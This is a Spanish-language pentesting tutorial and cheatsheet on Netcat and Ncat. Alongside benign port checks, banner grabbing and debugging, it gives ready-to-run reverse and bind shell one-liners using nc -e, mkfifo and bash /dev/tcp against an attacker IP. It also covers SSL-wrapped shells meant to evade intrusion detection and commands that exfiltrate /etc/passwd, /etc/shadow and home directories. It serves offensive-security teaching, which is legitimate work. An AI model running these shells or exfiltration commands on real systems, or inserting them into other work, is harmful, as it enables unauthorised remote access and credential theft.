## Netcat — una herramienta, mil usos

Netcat fue escrito en 1995 por Hobbit y desde entonces no ha cambiado fundamentalmente. La razón es simple: hace perfectamente lo que tiene que hacer. Lee y escribe datos a través de conexiones de red TCP o UDP. Eso es todo. Y esa simplicidad es exactamente lo que lo convierte en la herramienta más versátil del pentesting.

Lo que diferencia a Netcat de otras herramientas de red es que no tiene un propósito fijo. No es un escáner, no es un exploit, no es un framework. Es una tubería de red — conecta un proceso con una red del mismo modo que una tubería de Unix conecta la salida de un proceso con la entrada de otro. Lo que hagas con esa tubería depende completamente de ti.

En un engagement real, Netcat aparece en decenas de situaciones distintas: para recibir una reverse shell después de explotar una vulnerabilidad, para transferir herramientas al servidor comprometido sin tener acceso web, para comprobar si un puerto responde antes de perder tiempo con Nmap, para crear un canal de comunicación simple entre dos máquinas, o para hacer port forwarding cuando las herramientas más sofisticadas no están disponibles.

Hay múltiples implementaciones de Netcat con capacidades ligeramente distintas:

```
Implementaciones principales:
├── GNU Netcat (nc)          → La original, más básica
├── OpenBSD Netcat (nc)      → La más extendida en Linux/macOS modernos
│   └── Soporta: -e (ejecutar programa), proxy SOCKS
├── Ncat (incluido en Nmap)  → La más completa y moderna
│   └── Soporta: SSL, proxy, IPv6, múltiples conexiones
└── Netcat tradicional       → Algunos sistemas tienen versión antigua
    └── Soporta: -e flag para bind/reverse shell
```

La diferencia más importante en la práctica es el flag `-e`, que ejecuta un programa al conectarse. No todas las versiones lo soportan — en ese caso se usan workarounds con mkfifo que veremos en detalle.

## 1. Instalación y variantes

```bash
# Verificar qué versión de netcat está instalada
nc --version
nc -h 2>&1 | head -5

# En Kali Linux viene preinstalado. Instalar también Ncat:
sudo apt install netcat-openbsd ncat

# Verificar la ruta del binario
which nc
which ncat

# En algunos sistemas nc es un symlink a ncat o a la versión tradicional
ls -la /usr/bin/nc*

# En macOS, la versión por defecto es OpenBSD netcat
nc --version

# Instalar Ncat en macOS con Homebrew (viene con Nmap)
brew install nmap    # Incluye ncat
```

Cuando estás en un sistema comprometido y necesitas Netcat pero no está instalado, hay alternativas:

```bash
# Comprobar qué hay disponible en el sistema
which nc ncat netcat socat bash python python3 perl ruby

# Si hay Python:
python3 -c "import socket; print('socket disponible')"

# Si hay bash moderno, puede usarse /dev/tcp directamente (no es Netcat pero sirve)
bash -c 'echo > /dev/tcp/10.10.10.10/4444' 2>/dev/null && echo "Puerto abierto"
```

## 2. Conexiones básicas — TCP y UDP

Lo más fundamental que hace Netcat es establecer conexiones TCP y UDP. Entender el modelo cliente-servidor de Netcat es la base de todo lo demás.

### Modelo cliente-servidor en Netcat

Netcat opera en dos modos:

**Modo servidor (escucha)**: Netcat abre un puerto y espera a que alguien se conecte. El flag `-l` activa este modo. El proceso que escucha se llama "listener".

**Modo cliente**: Netcat se conecta a un servidor que ya está escuchando. Se especifica la IP y el puerto de destino como argumentos.

```bash
# SERVIDOR — escuchar en el puerto 4444
nc -lnvp 4444
# -l → modo listen (escucha)
# -n → no resolver nombres DNS (más rápido)
# -v → verbose (mostrar información de conexión)
# -p → especificar el puerto

# CLIENTE — conectarse al servidor
nc 10.10.10.10 4444

# Una vez conectados, todo lo que se escribe en un lado
# aparece en el otro. Es un chat básico bidireccional.
```

Este modelo tan simple es la base de reverse shells, bind shells, y transferencias de ficheros. Cambia lo que ejecutas en cada extremo y el comportamiento cambia completamente.

### Verificar conectividad con Netcat

Netcat es excelente para verificar rápidamente si un puerto responde antes de usar herramientas más pesadas:

```bash
# Comprobar si el puerto 80 está abierto en un host
nc -zv 10.10.10.10 80
# -z → modo escaneo (no envía datos, solo comprueba si hay conexión)
# -v → verbose para ver el resultado

# Comprobar múltiples puertos
nc -zv 10.10.10.10 20-25
nc -zv 10.10.10.10 22 80 443 3389

# Con timeout para no esperar indefinidamente
nc -zvw 3 10.10.10.10 80
# -w 3 → timeout de 3 segundos

# Escanear un rango de puertos (básico, no tan potente como Nmap)
for port in $(seq 1 1024); do
    nc -zw 1 10.10.10.10 $port 2>/dev/null && echo "Puerto $port abierto"
done

# Versión más rápida en paralelo
for port in $(seq 1 1024); do
    (nc -zw 1 10.10.10.10 $port 2>/dev/null && echo "$port") &
done | sort -n
wait
```

### Conexiones UDP

UDP es connectionless — Netcat no puede verificar si el puerto está abierto de la misma forma que con TCP, pero puede enviar y recibir datos UDP:

```bash
# Escuchar en UDP
nc -lnvup 53

# Conectarse a UDP
nc -u 10.10.10.10 53

# Verificar puerto UDP (el comportamiento varía según el servicio)
nc -zuv 10.10.10.10 161    # SNMP

# Enviar datos UDP y cerrar inmediatamente
echo "test" | nc -u -w1 10.10.10.10 514    # Syslog
```

### Capturar banners de servicios

Una de las primeras cosas que hace un pentester al encontrar un puerto abierto es capturar el banner del servicio para identificar qué software está corriendo y en qué versión:

```bash
# Capturar el banner de un servicio web
echo "HEAD / HTTP/1.0\r\n\r\n" | nc -w 5 10.10.10.10 80

# Banner de FTP — devuelve el banner de bienvenida automáticamente
nc -w 3 10.10.10.10 21

# Banner de SSH
nc -w 3 10.10.10.10 22

# Banner de SMTP
nc -w 3 10.10.10.10 25

# Banner de POP3
nc -w 3 10.10.10.10 110

# Interactuar manualmente con HTTP
nc 10.10.10.10 80
GET / HTTP/1.1
Host: 10.10.10.10
[Enter dos veces]

# La respuesta incluye cabeceras con información del servidor:
# Server: Apache/2.4.49 (Ubuntu)
# X-Powered-By: PHP/7.4.3
```

## 3. Reverse Shell con Netcat

La reverse shell es el uso más frecuente de Netcat en pentesting post-explotación. Cuando comprometes un servicio vulnerable en el servidor objetivo, necesitas un canal de comunicación para ejecutar comandos. La reverse shell hace que el servidor se conecte a tu máquina, eludiendo los firewalls que bloquean conexiones entrantes al servidor.

### Concepto de reverse shell

El flujo es siempre el mismo:

```
1. Atacante pone Netcat en modo escucha en su máquina
2. Atacante ejecuta un payload en el servidor víctima
3. El servidor víctima ejecuta una shell y la conecta al atacante
4. El atacante recibe la shell y puede ejecutar comandos en el servidor

[Atacante]  ←←← conexión iniciada por la víctima ←←←  [Víctima]
nc -lnvp 4444                                          nc -e /bin/bash atacante 4444
```

La dirección de la conexión (víctima → atacante) es lo que permite eludir firewalls que bloquean conexiones entrantes al servidor pero permiten conexiones salientes.

### Reverse shell con -e (versión tradicional)

```bash
# En el ATACANTE — preparar el listener primero
nc -lnvp 4444

# En la VÍCTIMA — ejecutar la reverse shell
# (solo en versiones de netcat que soportan -e)
nc 10.10.10.10 4444 -e /bin/bash      # Linux
nc 10.10.10.10 4444 -e /bin/sh        # Linux/Unix genérico
nc 10.10.10.10 4444 -e cmd.exe        # Windows
nc 10.10.10.10 4444 -e powershell.exe # Windows PowerShell

# Versión con ncat (siempre soporta -e)
ncat 10.10.10.10 4444 -e /bin/bash
```

### Reverse shell con mkfifo (cuando no hay -e)

Muchas versiones modernas de netcat eliminaron el flag `-e` por razones de seguridad. La alternativa estándar usa una named pipe (mkfifo) para crear el mismo canal bidireccional:

```bash
# En el ATACANTE
nc -lnvp 4444

# En la VÍCTIMA — reverse shell sin -e usando mkfifo
# Esta técnica funciona en prácticamente cualquier sistema Unix/Linux
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.10.10 4444 > /tmp/f

# Entendiendo el comando paso a paso:
# rm /tmp/f          → elimina la pipe si existía
# mkfifo /tmp/f      → crea una named pipe (archivo especial FIFO)
# cat /tmp/f         → lee de la pipe (esperando comandos del atacante)
# | /bin/bash -i     → pasa los comandos leídos a bash
# 2>&1               → redirige stderr a stdout (para ver errores también)
# | nc 10.10.10.10 4444 → envía el output de bash al atacante
# > /tmp/f           → redirige lo que recibe Netcat de vuelta a la pipe
#
# Resultado: los comandos del atacante van por la pipe a bash,
# y el output de bash vuelve al atacante por Netcat

# Versión en una línea más limpia (mismo comportamiento)
rm -f /tmp/p; mkfifo /tmp/p && nc 10.10.10.10 4444 0</tmp/p | /bin/bash > /tmp/p 2>&1; rm /tmp/p
```

### Reverse shell con bash nativo (sin Netcat)

Cuando ni siquiera hay Netcat en el sistema comprometido, bash moderno puede crear una conexión de red directamente usando `/dev/tcp`:

```bash
# Reverse shell pura en bash, sin necesidad de Netcat en la víctima
# El atacante sigue necesitando nc para escuchar
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# Desglose:
# bash -i         → shell interactiva
# >&              → redirige stdout y stderr
# /dev/tcp/IP/PORT → archivo especial que bash usa para conexiones TCP
# 0>&1            → redirige stdin al mismo destino que stdout
# Resultado: stdin, stdout y stderr van todos por la conexión TCP

# Versión alternativa que funciona en más contextos
exec 5<>/dev/tcp/10.10.10.10/4444
cat <&5 | while read line; do $line 2>&5 >&5; done
```

## 4. Bind Shell con Netcat

La bind shell es el opuesto de la reverse shell. En lugar de que la víctima se conecte al atacante, la víctima abre un puerto y el atacante se conecta. Es útil cuando la red del atacante no tiene IP pública fija o cuando hay NAT en el lado del atacante.

```
[Atacante]  →→→ conexión iniciada por el atacante →→→  [Víctima]
nc 10.10.10.10 4444                                     nc -lnvp 4444 -e /bin/bash
```

```bash
# En la VÍCTIMA — abrir el puerto y conectar una shell
nc -lnvp 4444 -e /bin/bash       # Con -e
# o con mkfifo si no hay -e:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l -p 4444 > /tmp/f

# En el ATACANTE — conectarse al puerto abierto
nc 10.10.10.10 4444

# Con Ncat (más robusto, soporta múltiples conexiones)
ncat -lnvp 4444 -e /bin/bash --keep-open   # Acepta múltiples conexiones
```

La bind shell tiene una desventaja importante en la práctica: el servidor víctima necesita que el puerto esté accesible desde internet, y la mayoría de los firewalls corporativos bloquean conexiones entrantes en puertos no estándar. Por eso la reverse shell es mucho más común.

## 5. Estabilizar una shell recibida por Netcat

Cuando recibes una reverse shell por Netcat, la shell que obtienes es muy básica: no tiene historial de comandos, Ctrl+C mata la conexión en lugar del proceso, los editores interactivos como vim o nano no funcionan, y el autocompletado con Tab no funciona. Para trabajar cómodamente necesitas estabilizar la shell.

### Método 1 — Python PTY (el más común)

```bash
# En la shell recibida — convertir a PTY con Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Si no hay Python3, probar con Python2:
python -c 'import pty; pty.spawn("/bin/bash")'

# Después del pty.spawn, hacer Ctrl+Z para pausar la shell
# y volver a tu terminal local

# En TU terminal — configurar el terminal para que funcione bien
stty raw -echo    # Enviar las teclas directamente sin procesamiento local
fg                # Traer la shell de vuelta al primer plano

# En la shell remota — configurar el tamaño del terminal y las variables
export TERM=xterm-256color
export SHELL=/bin/bash

# Obtener el tamaño actual de tu terminal (ejecutar en otra ventana local)
stty size         # Output: 38 220 (filas columnas)

# Configurar el mismo tamaño en la shell remota
stty rows 38 cols 220
```

### Método 2 — socat (la mejor calidad)

socat genera una shell totalmente interactiva de mejor calidad que la técnica con pty:

```bash
# En el ATACANTE — usar socat en lugar de nc para escuchar
socat file:`tty`,raw,echo=0 tcp-listen:4444

# En la VÍCTIMA — conectar con socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444

# Si no hay socat en la víctima, descargarlo como binario estático
# (guardar en /tmp para no necesitar privilegios de escritura en /usr)
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

### Método 3 — rlwrap (mínimo esfuerzo)

rlwrap añade historial de comandos y edición de línea a cualquier proceso, incluido el listener de Netcat:

```bash
# Instalar rlwrap
sudo apt install rlwrap

# Usar rlwrap con nc para tener historial y edición de línea
rlwrap nc -lnvp 4444

# Ahora en la shell recibida puedes usar la flecha arriba para el historial
# y Ctrl+A/E para ir al inicio/fin de línea
# No es tan completo como una PTY completa pero es mucho mejor que nc solo
```

## 6. Transferencia de ficheros con Netcat

Cuando has comprometido un sistema y necesitas subir herramientas o descargar datos, Netcat es a menudo la opción más simple y discreta — no requiere servidor web, no deja logs en el servidor, y funciona con lo que ya hay en el sistema.

### Transferir un fichero

El principio es simple: en un extremo Netcat lee el fichero y lo envía por la red, en el otro lo recibe y lo guarda:

```bash
# RECIBIR el fichero (ejecutar primero en el destino)
# El receptor escucha y redirige todo lo que recibe a un fichero
nc -lnvp 4444 > herramienta_recibida.exe

# ENVIAR el fichero (ejecutar segundo en el origen)
# El emisor se conecta y redirige el fichero a la conexión
nc 10.10.10.10 4444 < herramienta_a_enviar.exe

# Cuando termina la transferencia, nc cierra la conexión automáticamente.
# Verificar la integridad del fichero recibido:
md5sum herramienta_a_enviar.exe    # En el origen
md5sum herramienta_recibida.exe    # En el destino
# Los hashes deben coincidir
```

### Transferir directorios completos

Para transferir múltiples ficheros a la vez, combinar tar con Netcat:

```bash
# RECIBIR el directorio
nc -lnvp 4444 | tar xzvf -

# ENVIAR el directorio completo comprimido
tar czvf - /directorio/a/enviar | nc 10.10.10.10 4444

# Sin compresión (más rápido si la red es rápida y el espacio no importa)
# RECIBIR
nc -lnvp 4444 | tar xvf -

# ENVIAR
tar cvf - /directorio/ | nc 10.10.10.10 4444
```

### Servidor de ficheros simple

Netcat puede actuar como un servidor de ficheros muy básico para servir un fichero múltiples veces:

```bash
# Servir un fichero indefinidamente usando un bucle
# (nc por defecto cierra la conexión después de la primera transferencia)
while true; do nc -lnvp 8080 < linpeas.sh; done

# Más elegante: usar -k (keep-open) si la versión lo soporta
nc -lnvkp 8080 < linpeas.sh   # -k: mantener escuchando después de cada conexión

# En el cliente (sistema comprometido) descargar el fichero
nc 10.10.10.10 8080 > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Transferencia con cifrado usando Ncat

Cuando la transferencia puede ser monitorizada y necesitas cifrado:

```bash
# RECIBIR con SSL
ncat --ssl -lnvp 4444 > fichero_recibido

# ENVIAR con SSL
ncat --ssl 10.10.10.10 4444 < fichero_a_enviar
```

## 7. Port Forwarding y Proxying

Netcat puede reenviar tráfico de red, aunque para uso serio en pivoting hay herramientas más potentes como socat o chisel. Sin embargo, el port forwarding básico con Netcat es útil cuando esas herramientas no están disponibles.

### Port forwarding simple con mkfifo

```bash
# Reenviar el puerto local 8080 al puerto 80 de otro host
# Todo lo que llegue al puerto 8080 local se reenvía a 10.10.10.20:80
rm /tmp/pf; mkfifo /tmp/pf
nc -lnvp 8080 < /tmp/pf | nc 10.10.10.20 80 > /tmp/pf

# Caso de uso: tienes acceso a una máquina intermedia (10.10.10.10)
# y quieres acceder a un servicio en 10.10.10.20 que no es accesible directamente

# [Tu máquina] → :8080 → [10.10.10.10:8080] → [10.10.10.20:80]
# En 10.10.10.10:
rm /tmp/pf; mkfifo /tmp/pf
nc -lnvp 8080 < /tmp/pf | nc 10.10.10.20 80 > /tmp/pf

# En tu máquina:
curl http://10.10.10.10:8080    # El tráfico llega a 10.10.10.20:80
```

### Chat cifrado simple con Ncat

```bash
# Servidor
ncat --ssl -lnvp 4444

# Cliente
ncat --ssl 10.10.10.10 4444
```

## 8. Técnicas avanzadas con Ncat

Ncat es la versión moderna de Netcat incluida con Nmap. Añade funcionalidades importantes que la versión clásica no tiene.

### Múltiples clientes simultáneos

```bash
# Ncat puede aceptar múltiples conexiones simultáneas con --broker
# Actúa como un hub: todo lo que envía un cliente lo reciben todos los demás
ncat --broker -lnvp 4444

# Caso de uso: múltiples shells del mismo objetivo conectadas al mismo listener
# o comunicación entre varios miembros de un equipo Red Team
```

### Acceso con control de origen

```bash
# Solo aceptar conexiones desde una IP específica
# Útil para que solo tu máquina pueda conectarse al listener
ncat --allow 10.10.10.5 -lnvp 4444 -e /bin/bash

# Denegar conexiones de IPs específicas
ncat --deny 10.10.10.100 -lnvp 4444
```

### Reverse shell con SSL para evadir IDS

Los IDS/IPS modernos pueden detectar tráfico de Netcat sin cifrar. Ncat con SSL hace que el tráfico parezca HTTPS:

```bash
# ATACANTE — listener con SSL en puerto 443 (parece HTTPS legítimo)
ncat --ssl -lnvp 443

# VÍCTIMA — conectar con SSL
ncat --ssl 10.10.10.10 443 -e /bin/bash
# o con mkfifo:
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | ncat --ssl 10.10.10.10 443 > /tmp/f
```

## 9. Casos de uso en entornos reales

### Exfiltración de datos

```bash
# Exfiltrar el fichero /etc/passwd del sistema comprometido
# ATACANTE — escuchar y guardar
nc -lnvp 4444 > passwd_exfiltrado.txt

# VÍCTIMA — enviar el fichero
cat /etc/passwd | nc 10.10.10.10 4444

# Exfiltrar la base de datos de hashes (shadow)
nc -lnvp 4444 > shadow_exfiltrado.txt       # ATACANTE
cat /etc/shadow | nc 10.10.10.10 4444        # VÍCTIMA (requiere root)

# Exfiltrar un directorio completo con tar y compresión
nc -lnvp 4444 | tar xzf - -C /tmp/exfil/    # ATACANTE
tar czf - /home/usuario/ | nc 10.10.10.10 4444  # VÍCTIMA
```

### Verificar reglas de firewall

```bash
# Desde fuera del firewall — comprobar qué puertos salen
# En el servidor externo (atacante):
for port in 21 22 25 53 80 443 8080 4444; do
    nc -lnvp $port &
done

# En el servidor interno (detrás del firewall):
for port in 21 22 25 53 80 443 8080 4444; do
    nc -w 2 servidor_externo $port && echo "Puerto $port: SALIDA PERMITIDA"
done

# Esto revela qué puertos de salida permite el firewall
# Muy útil para elegir el puerto de la reverse shell
```

### Debugging de servicios de red

```bash
# Simular un servidor HTTP muy básico
while true; do
    echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHola desde Netcat" \
    | nc -lnvp 80
done

# Interceptar y ver peticiones HTTP sin modificarlas
# (útil para debuggear aplicaciones que hacen requests)
nc -lnvp 8080 | tee peticion_capturada.txt

# Enviar una petición HTTP manual y ver la respuesta completa
printf "GET /api/users HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" \
    | nc example.com 80
```

## 10. Cheatsheet de referencia rápida

```bash
# ── CONEXIONES BÁSICAS ────────────────────────────────────────────────────
nc -lnvp 4444              # Escuchar en puerto 4444
nc 10.10.10.10 4444        # Conectarse a IP:puerto
nc -zv 10.10.10.10 80      # Verificar si puerto está abierto
nc -zvw3 10.10.10.10 1-100 # Escanear puertos 1-100 con timeout

# ── REVERSE SHELLS ────────────────────────────────────────────────────────
# Listener (atacante)
nc -lnvp 4444
rlwrap nc -lnvp 4444       # Con historial de comandos

# Payload (víctima) — con -e
nc 10.10.10.10 4444 -e /bin/bash

# Payload (víctima) — sin -e (mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f

# Payload bash nativo (sin netcat en víctima)
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# ── BIND SHELLS ───────────────────────────────────────────────────────────
nc -lnvp 4444 -e /bin/bash    # Víctima — abrir puerto con shell
nc 10.10.10.10 4444           # Atacante — conectarse

# ── ESTABILIZAR SHELL RECIBIDA ────────────────────────────────────────────
# 1. En la shell recibida:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 2. Ctrl+Z
# 3. En terminal local:
stty raw -echo; fg
# 4. En shell remota:
export TERM=xterm-256color; stty rows 38 cols 220

# ── TRANSFERENCIA DE FICHEROS ─────────────────────────────────────────────
# RECIBIR:
nc -lnvp 4444 > fichero_recibido
# ENVIAR:
nc 10.10.10.10 4444 < fichero_a_enviar

# Directorio completo:
# RECIBIR: nc -lnvp 4444 | tar xzvf -
# ENVIAR:  tar czvf - /directorio/ | nc 10.10.10.10 4444

# ── CAPTURA DE BANNERS ────────────────────────────────────────────────────
nc -w3 10.10.10.10 21      # FTP
nc -w3 10.10.10.10 22      # SSH
nc -w3 10.10.10.10 25      # SMTP
echo "HEAD / HTTP/1.0\r\n\r\n" | nc -w3 10.10.10.10 80   # HTTP
```
